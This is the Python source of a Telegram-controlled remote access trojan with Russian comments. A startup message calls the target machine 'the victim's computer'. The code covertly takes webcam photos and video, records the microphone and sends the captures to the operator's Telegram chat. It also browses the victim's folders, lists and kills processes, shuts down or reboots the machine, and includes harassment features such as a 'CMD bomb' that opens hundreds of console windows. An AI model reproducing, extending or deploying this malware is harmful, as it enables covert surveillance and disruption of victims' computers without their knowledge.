import os
import sys
import time
import random
import shutil
import subprocess
import psutil
import platform
import threading
from cryptography.fernet import Fernet
import cv2
import pyaudio
import wave
import pyautogui
import ctypes
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

# Конфигурация
BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА'
ALLOWED_USER_IDS = [123456789]  # Замените на ваш ID в Telegram
WEB_CAMERA_INDEX = 0  # Обычно 0 для веб-камеры по умолчанию
AUDIO_RECORD_CHUNK = 1024
AUDIO_RECORD_FORMAT = pyaudio.paInt16
AUDIO_RECORD_CHANNELS = 2
AUDIO_RECORD_RATE = 44100

# Инициализация шифрования
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Глобальные переменные
current_directory = os.path.expanduser("~")
is_cursor_mad = False

def restricted(func):
    """Декоратор для ограничения доступа к боту"""
    def wrapped(update: Update, context: CallbackContext, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ALLOWED_USER_IDS:
            update.message.reply_text("Доступ запрещен. Вы не авторизованы для использования этого бота.")
            return
        return func(update, context, *args, **kwargs)
    return wrapped

@restricted
def start(update: Update, context: CallbackContext):
    """Отправляет сообщение при команде /start"""
    keyboard = [
        [InlineKeyboardButton("🖥 Информация о ПК", callback_data='pc_info')],
        [InlineKeyboardButton("📂 Просмотр папок", callback_data='browse_dir')],
        [InlineKeyboardButton("📷 Фото с камеры", callback_data='webcam_photo')],
        [InlineKeyboardButton("🎥 Запись с камеры", callback_data='webcam_record')],
        [InlineKeyboardButton("🎤 Запись с микрофона", callback_data='mic_record')],
        [InlineKeyboardButton("⚙️ Управление системой", callback_data='system_controls')],
        [InlineKeyboardButton("📊 Запущенные процессы", callback_data='running_processes')],
        [InlineKeyboardButton("💣 Разное", callback_data='fun_stuff')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text('Готов к работе, сэр!', reply_markup=reply_markup)

def button_handler(update: Update, context: CallbackContext):
    """Обработчик нажатий кнопок"""
    query = update.callback_query
    query.answer()

    if query.data == 'pc_info':
        pc_info_menu(update, context)
    elif query.data == 'browse_dir':
        browse_dir_menu(update, context)
    elif query.data == 'webcam_photo':
        take_webcam_photo(update, context)
    elif query.data == 'webcam_record':
        context.bot.send_message(chat_id=query.message.chat_id, text="Введите время записи в секундах:")
        context.user_data['waiting_for'] = 'webcam_record_time'
    elif query.data == 'mic_record':
        context.bot.send_message(chat_id=query.message.chat_id, text="Введите время записи в секундах:")
        context.user_data['waiting_for'] = 'mic_record_time'
    elif query.data == 'system_controls':
        system_controls_menu(update, context)
    elif query.data == 'running_processes':
        show_running_processes(update, context)
    elif query.data == 'fun_stuff':
        fun_stuff_menu(update, context)
    elif query.data == 'back_to_main':
        start(update, context)

def pc_info_menu(update: Update, context: CallbackContext):
    """Меню информации о ПК"""
    keyboard = [
        [InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Получаем информацию о системе
    uname = platform.uname()
    cpu_info = f"Процессор: {uname.processor}\nЯдер: {psutil.cpu_count(logical=False)}\nПотоков: {psutil.cpu_count(logical=True)}"
    memory = psutil.virtual_memory()
    mem_info = f"ОЗУ: {memory.total / (1024**3):.2f} GB\nИспользуется: {memory.percent}%"
    disk_info = ""
    for part in psutil.disk_partitions():
        usage = psutil.disk_usage(part.mountpoint)
        disk_info += f"\nДиск {part.device}:\n  Всего: {usage.total / (1024**3):.2f} GB\n  Используется: {usage.percent}%"
    
    message = (
        f"💻 Информация о системе:\n"
        f"Система: {uname.system}\n"
        f"Версия: {uname.version}\n"
        f"Машина: {uname.machine}\n\n"
        f"{cpu_info}\n\n"
        f"{mem_info}\n"
        f"{disk_info}"
    )
    
    context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=message, reply_markup=reply_markup)

def take_webcam_photo(update: Update, context: CallbackContext):
    """Сделать фото с веб-камеры"""
    try:
        cap = cv2.VideoCapture(WEB_CAMERA_INDEX)
        ret, frame = cap.read()
        if ret:
            photo_path = os.path.join(os.getcwd(), "webcam_photo.jpg")
            cv2.imwrite(photo_path, frame)
            with open(photo_path, 'rb') as photo:
                context.bot.send_photo(chat_id=update.callback_query.message.chat_id, photo=photo)
            os.remove(photo_path)
        else:
            context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="Не удалось получить доступ к камере.")
        cap.release()
    except Exception as e:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=f"Ошибка: {str(e)}")

def record_webcam(update: Update, context: CallbackContext, duration: int):
    """Записать видео с веб-камеры"""
    try:
        cap = cv2.VideoCapture(WEB_CAMERA_INDEX)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        video_path = os.path.join(os.getcwd(), "webcam_video.avi")
        out = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))
        
        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            else:
                break
        
        cap.release()
        out.release()
        
        with open(video_path, 'rb') as video:
            context.bot.send_video(chat_id=update.message.chat_id, video=video)
        os.remove(video_path)
    except Exception as e:
        context.bot.send_message(chat_id=update.message.chat_id, text=f"Ошибка: {str(e)}")

def record_microphone(update: Update, context: CallbackContext, duration: int):
    """Записать звук с микрофона"""
    try:
        audio = pyaudio.PyAudio()
        stream = audio.open(format=AUDIO_RECORD_FORMAT,
                           channels=AUDIO_RECORD_CHANNELS,
                           rate=AUDIO_RECORD_RATE,
                           input=True,
                           frames_per_buffer=AUDIO_RECORD_CHUNK)
        
        frames = []
        for _ in range(0, int(AUDIO_RECORD_RATE / AUDIO_RECORD_CHUNK * duration)):
            data = stream.read(AUDIO_RECORD_CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        audio.terminate()
        
        audio_path = os.path.join(os.getcwd(), "microphone_record.wav")
        with wave.open(audio_path, 'wb') as wf:
            wf.setnchannels(AUDIO_RECORD_CHANNELS)
            wf.setsampwidth(audio.get_sample_size(AUDIO_RECORD_FORMAT))
            wf.setframerate(AUDIO_RECORD_RATE)
            wf.writeframes(b''.join(frames))
        
        with open(audio_path, 'rb') as audio_file:
            context.bot.send_audio(chat_id=update.message.chat_id, audio=audio_file)
        os.remove(audio_path)
    except Exception as e:
        context.bot.send_message(chat_id=update.message.chat_id, text=f"Ошибка: {str(e)}")

def system_controls_menu(update: Update, context: CallbackContext):
    """Меню управления системой"""
    keyboard = [
        [InlineKeyboardButton("🔒 Закрыть текущее окно", callback_data='close_current_window')],
        [InlineKeyboardButton("🚫 Закрыть все окна", callback_data='close_all_windows')],
        [InlineKeyboardButton("🖼 Сменить обои", callback_data='change_wallpaper')],
        [InlineKeyboardButton("⏻ Выключить ПК", callback_data='shutdown_pc')],
        [InlineKeyboardButton("🔄 Перезагрузить ПК", callback_data='reboot_pc')],
        [InlineKeyboardButton("❌ Закрыть Диспетчер задач", callback_data='close_task_manager')],
        [InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="Выберите действие:", reply_markup=reply_markup)

def shutdown_pc(update: Update, context: CallbackContext):
    """Выключение компьютера"""
    confirmation_code = random.randint(10, 110)
    context.user_data['shutdown_code'] = confirmation_code
    context.bot.send_message(chat_id=update.callback_query.message.chat_id, 
                           text=f"Для подтверждения выключения введите код: {confirmation_code}\n"
                                "Если передумали - просто проигнорируйте это сообщение.")

def reboot_pc(update: Update, context: CallbackContext):
    """Перезагрузка компьютера"""
    try:
        if os.name == 'nt':
            os.system("shutdown /r /t 1")
        else:
            os.system("sudo shutdown -r now")
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="Компьютер перезагружается...")
    except Exception as e:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=f"Ошибка: {str(e)}")

def close_current_window(update: Update, context: CallbackContext):
    """Закрытие текущего окна"""
    try:
        if os.name == 'nt':
            # Для Windows
            import win32gui
            import win32con
            window = win32gui.GetForegroundWindow()
            win32gui.PostMessage(window, win32con.WM_CLOSE, 0, 0)
        else:
            # Для Linux (требуется xdotool)
            os.system("xdotool getwindowfocus windowkill")
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="Текущее окно закрыто.")
    except Exception as e:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=f"Ошибка: {str(e)}")

def close_all_windows(update: Update, context: CallbackContext):
    """Закрытие всех окон"""
    try:
        if os.name == 'nt':
            # Для Windows
            os.system("taskkill /F /IM explorer.exe")
            os.system("start explorer.exe")
        else:
            # Для Linux (требуется wmctrl)
            os.system("wmctrl -c :ACTIVE:")
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="Все окна закрыты.")
    except Exception as e:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=f"Ошибка: {str(e)}")

def change_wallpaper(update: Update, context: CallbackContext):
    """Смена обоев"""
    context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="Пожалуйста, отправьте изображение для установки как обои.")
    context.user_data['waiting_for'] = 'wallpaper_image'

def set_wallpaper(update: Update, context: CallbackContext):
    """Установка обоев из полученного изображения"""
    try:
        photo_file = update.message.photo[-1].get_file()
        wallpaper_path = os.path.join(os.getcwd(), "wallpaper.jpg")
        photo_file.download(wallpaper_path)
        
        if os.name == 'nt':
            # Для Windows
            import win32gui
            import win32con
            import win32api
            SPI_SETDESKWALLPAPER = 20
            win32gui.SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaper_path, win32con.SPIF_SENDWININICHANGE)
        else:
            # Для Linux (требуется feh или подобное)
            os.system(f"gsettings set org.gnome.desktop.background picture-uri file://{wallpaper_path}")
        
        context.bot.send_message(chat_id=update.message.chat_id, text="Обои успешно изменены.")
        os.remove(wallpaper_path)
    except Exception as e:
        context.bot.send_message(chat_id=update.message.chat_id, text=f"Ошибка: {str(e)}")

def browse_dir_menu(update: Update, context: CallbackContext):
    """Меню просмотра папок"""
    global current_directory
    
    try:
        items = os.listdir(current_directory)
        keyboard = []
        
        # Добавляем кнопки для папок и файлов
        for item in items:
            full_path = os.path.join(current_directory, item)
            if os.path.isdir(full_path):
                keyboard.append([InlineKeyboardButton(f"📁 {item} (*папка*)", callback_data=f'browse_{full_path}')])
            else:
                keyboard.append([InlineKeyboardButton(f"📄 {item}", callback_data=f'file_{full_path}')])
        
        # Добавляем кнопки навигации
        if current_directory != os.path.dirname(current_directory):
            keyboard.append([InlineKeyboardButton("⬆️ На уровень выше", callback_data=f'browse_{os.path.dirname(current_directory)}')])
        
        keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, 
                                text=f"Содержимое папки: {current_directory}", 
                                reply_markup=reply_markup)
    except Exception as e:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=f"Ошибка: {str(e)}")

def show_running_processes(update: Update, context: CallbackContext):
    """Показать запущенные процессы"""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            processes.append(f"PID: {proc.info['pid']}, {proc.info['name']}")
        
        # Разделяем на сообщения по 20 процессов, чтобы не превысить лимит Telegram
        for i in range(0, len(processes), 20):
            message = "\n".join(processes[i:i+20])
            context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=message)
        
        keyboard = [
            [InlineKeyboardButton("❌ Завершить процесс", callback_data='kill_process')],
            [InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, 
                               text="Чтобы завершить процесс, введите его PID:", 
                               reply_markup=reply_markup)
    except Exception as e:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=f"Ошибка: {str(e)}")

def kill_process(update: Update, context: CallbackContext):
    """Завершение процесса по PID"""
    try:
        pid = int(update.message.text)
        os.kill(pid, 9)
        context.bot.send_message(chat_id=update.message.chat_id, text=f"Процесс с PID {pid} завершен.")
    except Exception as e:
        context.bot.send_message(chat_id=update.message.chat_id, text=f"Ошибка: {str(e)}")

def fun_stuff_menu(update: Update, context: CallbackContext):
    """Меню разного функционала"""
    keyboard = [
        [InlineKeyboardButton("🌀 Безумный курсор", callback_data='crazy_cursor')],
        [InlineKeyboardButton("💣 CMD бомба", callback_data='cmd_bomb')],
        [InlineKeyboardButton("📀 Открыть дисковод", callback_data='open_cd_drive')],
        [InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    context.bot.send_message(chat_id=update.callback_query.message.chat_id, 
                           text="Выберите действие:", 
                           reply_markup=reply_markup)

def crazy_cursor(update: Update, context: CallbackContext):
    """Безумное движение курсора"""
    context.bot.send_message(chat_id=update.callback_query.message.chat_id, 
                           text="Введите время (в секундах) для безумного курсора:")
    context.user_data['waiting_for'] = 'crazy_cursor_time'

def run_crazy_cursor(update: Update, context: CallbackContext, duration: int):
    """Запуск безумного курсора"""
    global is_cursor_mad
    is_cursor_mad = True
    
    def cursor_thread():
        start_time = time.time()
        while is_cursor_mad and (time.time() - start_time) < duration:
            x, y = pyautogui.position()
            new_x = x + random.randint(-50, 50)
            new_y = y + random.randint(-50, 50)
            pyautogui.moveTo(new_x, new_y, duration=0.1)
            time.sleep(0.1)
    
    threading.Thread(target=cursor_thread).start()
    context.bot.send_message(chat_id=update.message.chat_id, text=f"Курсор будет безумным {duration} секунд!")

def cmd_bomb(update: Update, context: CallbackContext):
    """CMD бомба"""
    context.bot.send_message(chat_id=update.callback_query.message.chat_id, 
                           text="Введите количество CMD окон (макс. 450):")
    context.user_data['waiting_for'] = 'cmd_bomb_count'

def run_cmd_bomb(update: Update, context: CallbackContext, count: int):
    """Запуск CMD бомбы"""
    try:
        count = min(450, max(1, int(count)))
        for _ in range(count):
            if os.name == 'nt':
                os.system("start cmd")
            else:
                os.system("xterm &")
        context.bot.send_message(chat_id=update.message.chat_id, text=f"Открыто {count} CMD окон!")
    except Exception as e:
        context.bot.send_message(chat_id=update.message.chat_id, text=f"Ошибка: {str(e)}")

def open_cd_drive(update: Update, context: CallbackContext):
    """Открытие дисковода"""
    try:
        if os.name == 'nt':
            ctypes.windll.WINMM.mciSendStringW("set cdaudio door open", None, 0, None)
        else:
            os.system("eject /dev/cdrom")
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="Дисковод открыт!")
    except Exception as e:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=f"Ошибка: {str(e)}")

def handle_message(update: Update, context: CallbackContext):
    """Обработчик текстовых сообщений"""
    if 'waiting_for' not in context.user_data:
        return
    
    waiting_for = context.user_data['waiting_for']
    
    try:
        if waiting_for == 'webcam_record_time':
            duration = int(update.message.text)
            if duration > 0:
                threading.Thread(target=record_webcam, args=(update, context, duration)).start()
                context.bot.send_message(chat_id=update.message.chat_id, text=f"Начинаю запись с камеры на {duration} секунд...")
            else:
                context.bot.send_message(chat_id=update.message.chat_id, text="Время должно быть больше 0 секунд.")
        
        elif waiting_for == 'mic_record_time':
            duration = int(update.message.text)
            if duration > 0:
                threading.Thread(target=record_microphone, args=(update, context, duration)).start()
                context.bot.send_message(chat_id=update.message.chat_id, text=f"Начинаю запись с микрофона на {duration} секунд...")
            else:
                context.bot.send_message(chat_id=update.message.chat_id, text="Время должно быть больше 0 секунд.")
        
        elif waiting_for == 'wallpaper_image':
            set_wallpaper(update, context)
        
        elif waiting_for == 'crazy_cursor_time':
            duration = int(update.message.text)
            if duration > 0:
                run_crazy_cursor(update, context, duration)
            else:
                context.bot.send_message(chat_id=update.message.chat_id, text="Время должно быть больше 0 секунд.")
        
        elif waiting_for == 'cmd_bomb_count':
            run_cmd_bomb(update, context, update.message.text)
        
        elif waiting_for == 'shutdown_confirmation':
            if update.message.text == str(context.user_data.get('shutdown_code', '')):
                if os.name == 'nt':
                    os.system("shutdown /s /t 1")
                else:
                    os.system("sudo shutdown -h now")
                context.bot.send_message(chat_id=update.message.chat_id, text="Компьютер выключается...")
            else:
                context.bot.send_message(chat_id=update.message.chat_id, text="Неверный код подтверждения.")
        
        elif waiting_for == 'kill_process':
            kill_process(update, context)
        
        del context.user_data['waiting_for']
    except ValueError:
        context.bot.send_message(chat_id=update.message.chat_id, text="Пожалуйста, введите число.")
    except Exception as e:
        context.bot.send_message(chat_id=update.message.chat_id, text=f"Ошибка: {str(e)}")

def error_handler(update: Update, context: CallbackContext):
    """Обработчик ошибок"""
    print(f"Ошибка: {context.error}")
    if update and update.message:
        update.message.reply_text("Произошла ошибка. Пожалуйста, попробуйте еще раз.")

def main():
    """Запуск бота"""
    # Уведомление о включении компьютера
    if len(sys.argv) > 1 and sys.argv[1] == "startup":
        updater = Updater(BOT_TOKEN, use_context=True)
        for user_id in ALLOWED_USER_IDS:
            updater.bot.send_message(chat_id=user_id, text="Компьютер жертвы включен, нажмите /start для начала работы")
        return
    
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    
    # Обработчики команд
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    dp.add_error_handler(error_handler)
    
    # Запуск бота
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == "shutdown":
        updater = Updater(BOT_TOKEN, use_context=True)
        for user_id in ALLOWED_USER_IDS:
            updater.bot.send_message(chat_id=user_id, text="Эх, компьютер выключается")
    else:
        main()